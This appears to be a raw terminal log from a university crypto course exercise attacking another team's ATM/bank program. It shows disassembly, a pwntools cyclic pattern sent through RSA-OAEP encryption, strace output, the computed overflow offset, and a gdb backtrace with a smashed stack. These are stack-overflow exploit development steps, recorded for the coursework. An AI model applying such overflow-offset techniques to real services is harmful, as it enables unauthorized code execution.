avi@aweinstock-debian:~/Documents/rpi_fall2015/crypto/otherteam_final/atm$ objdump -d backup_bins/bank | grep -A5 'thread_handlePv>:'
0000000000412a10 <_Z13thread_handlePv>:
  412a10:       55                      push   %rbp
  412a11:       48 89 e5                mov    %rsp,%rbp
  412a14:       48 81 ec 70 01 00 00    sub    $0x170,%rsp
  412a1b:       48 8d 04 25 a0 97 62    lea    0x6297a0,%rax
  412a22:       00 
-----
avi@aweinstock-debian:~/Documents/rpi_fall2015/crypto/otherteam_final/atm$ xxd backup_bins/bank | grep 'ed\.'   000b9d0: 6c5f 756e 6578 7065 6374 6564 005f 5a53  l_unexpected._ZS
001d260: 7265 6164 2063 7265 6174 6564 004e 6577  read created.New
001d280: 7320 7061 7273 6564 0052 4541 443a 2000  s parsed.READ: .
001d370: 6574 2062 696e 6420 6661 696c 6564 004c  et bind failed.L
001d3b0: 7420 6c69 7374 656e 2066 6169 6c65 6400  t listen failed.
001d910: 6569 6e69 7469 616c 697a 6564 006e 203c  einitialized.n <
001da30: 616c 6c6f 6361 7465 6400 766f 6964 2043  allocated.void C
002f8f0: 706c 6574 6564 2e36 3937 3300 5f5f 646f  pleted.6973.__do
00315c0: 4f5f 7374 6469 6e5f 7573 6564 005f 5a4e  O_stdin_used._ZN
-----
*Main> pub
PublicKey {public_size = 384, public_n = 4728977487432833207231063170861537275107631947371200572454929534137882898506950673724308317992087411199224634248078098993157239699520929006151626572844876338590566128601330324202263335310407768873920085187879352000455796661511643479345529404156368213236618112251319812551456208480198716446612926623670144123657141379251590285302654278078578921356329644496051691489607085959697808423007397814881809063045164830887783453280063703751975338128379975585196373819784316128817850290062499309417007129419279157310142761700551008543798004293578170356460639664548380837896237936195304558310159414813017020316717874964152334005415221764667510905801991630207128186457996990493931236520552308410119989858915767171670189741228911969388669797231430083924875357455110135594927057744177331697578578988386033017107981123988135247598628244759370251741191839493806189619731519866794594735942800626568946229112268435050368804775487637044723113261, public_e = 17}
*Main> let f n = encrypt (defaultOAEPParams SHA1) pub $ B.replicate n 0x41
*Main> f 343
Left MessageTooLong
*Main> f 342
Right "\179\192Q\171]\235\t\183\&8\209^u\167\175C\132\168C\188\178nX[\161\245\218\250\&3\228\188K\183\151\160?V\165\138\252}\207\128=\NAK\159\204\243h\FS\181M\229\181e\170\207\148h\176\220@\216m\245\\\164\172\138\169\151^\143\219\212\226\&7\237\139q\129\167 \255\CANS\238\202\t\215\138\220\253\233\224G[\210\204\152~_\228{\229\249>\133CvG\150\222k\173\133\&7Q\216p\SUB\196\DC4\158X\149\186\EOTW\170\ETB\233V\SI\"X]\nG\204=\135m\210\194\132\166\215\213\ETX\146\244\216\167\EM\129\228\226\144\184}\230\177\DC1\207\149\226}\bG\r\240P\142B\193\EMx\130\DLED}^\150\ESCk\235\DC2\191\241C|8H2J7\239\SUB\187\NAK:WX\160\138%\240\170\145\&3\223<\177\&4\137A'\ESC\237,?\152vG*\191X\169`\232\DC4\136h<dr\152\179A\246\128V\241\rWN\155\RS\208.(90\b\143^\tQ#kn\FS-\DC1\174\&4P\199 \173\&9g\251\246&\176\231\134 \227\165\180\171\137\252\216AI\"\232\254'\SOs\178Lv@\DC4\164\249H\158\240\181'=\185\USYv\t\155F\188$\223>\254tG<\188\227\v-\191b')l\197\NAK$\DC1<\209\236,\252\"R\152H\SIZ\201\237\243&\192\233X\233\233w_,\NUL\SO\189\153u,'/\170%T\153\242\204\149\156o,\230x\GSA\249\"\210\f"
-----
$ python -c 'import pwn; print pwn.cyclic(342)'
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka
-----
[pid 27656] read(4, "dummy", 512)       = 5
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "\24c\2458a1~\267\336[\235C\214\343d\36Q\373\336Y`\357\21\371NL\302\341e\f\35\357", 32) = 32
[pid 27656] close(6)                    = 0
[pid 27656] write(4, "DUMMY", 5)        = 5
[pid 27656] read(1633771882, 0x7f9e32448ad0, 128) = -1 EBADF (Bad file descriptor)
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "{5\7\5\250v@\227(\300\321\307\345bFQ\20\261:\277\25EB\312\272\272\302C\350\270v7", 32) = 32
[pid 27656] close(6)                    = 0
[pid 27656] read(1633771882, 0x7f9e32448ad0, 128) = -1 EBADF (Bad file descriptor)
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "V\303\242\205\7f\2474\201\376%2\302\30\313\237\20h\344\232l\3\312f59\205K_.%\342", 32) = 32
[pid 27656] close(6)                    = 0
[pid 27656] read(1633771882, 0x7f9e32448ad0, 128) = -1 EBADF (Bad file descriptor)
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "o\250\217iQ\3\346L\32\306]z\20306{l[\00701\356\353\301\212\220zIQY\365\302", 32) = 32
[pid 27656] close(6)                    = 0
-----
$ python -c 'from pwn import *; print cyclic_find(p32(1633771882))'
36
-----
(gdb) t 3
[Switching to thread 3 (Thread 0x7ffff6187700 (LWP 27877))]
#0  0x00007ffff74c11fd in read () from /lib/x86_64-linux-gnu/libpthread.so.0
(gdb) bt
#0  0x00007ffff74c11fd in read () from /lib/x86_64-linux-gnu/libpthread.so.0
#1  0x00007ffff7a74849 in CryptoPP::NonblockingRng::GenerateBlock(unsigned char*, unsigned long) ()
   from /usr/lib/libcrypto++.so.9
#2  0x00007ffff7a749e4 in CryptoPP::OS_GenerateRandomBlock(bool, unsigned char*, unsigned long) ()
   from /usr/lib/libcrypto++.so.9
#3  0x00007ffff7a74a91 in CryptoPP::AutoSeededRandomPool::Reseed(bool, unsigned int) ()
   from /usr/lib/libcrypto++.so.9
#4  0x000000000041ec2e in CryptoPP::AutoSeededRandomPool::AutoSeededRandomPool(bool, unsigned int) ()
#5  0x0000000000419db4 in action::decrypt_aes(std::string const&, unsigned char*, unsigned char*) ()
#6  0x0000000000419c42 in action::Action::recv(int, std::string&, unsigned char*, unsigned char*) ()
#7  0x000000000041dccd in thread_handle(void*) ()
#8  0x4242424242424242 in ?? ()
#9  0x4242424242424242 in ?? ()
#10 0x4242424242424242 in ?? ()
#11 0x4242424242424242 in ?? ()
#12 0x4242424242424242 in ?? ()
#13 0x4242424242424242 in ?? ()
#14 0x4242424242424242 in ?? ()
#15 0x4242424242424242 in ?? ()
#16 0x4242424242424242 in ?? ()
#17 0x4242424242424242 in ?? ()
#18 0x4242424242424242 in ?? ()
#19 0x4242424242424242 in ?? ()
#20 0x4242424242424242 in ?? ()
#21 0x4242424242424242 in ?? ()
#22 0x4242424242424242 in ?? ()
#23 0x4242424242424242 in ?? ()
#24 0x4242424242424242 in ?? ()
#25 0x4242424242424242 in ?? ()
#26 0x4242424242424242 in ?? ()
#27 0x4242424242424242 in ?? ()
#28 0x4242424242424242 in ?? ()
#29 0x4242424242424242 in ?? ()
#30 0x4242424242424242 in ?? ()
#31 0x4242424242424242 in ?? ()
#32 0x4242424242424242 in ?? ()
#33 0x4242424242424242 in ?? ()
#34 0x4242424242424242 in ?? ()
#35 0x4242424242424242 in ?? ()
#36 0x4242424242424242 in ?? ()
#37 0x4242424242424242 in ?? ()
#38 0x4242424242424242 in ?? ()
#39 0x4242424242424242 in ?? ()
#40 0x4242424242424242 in ?? ()
#41 0x0000424242424242 in ?? ()
#42 0x00007ffff6a6495d in clone () from /lib/x86_64-linux-gnu/libc.so.6
#43 0x0000000000000000 in ?? ()
-----
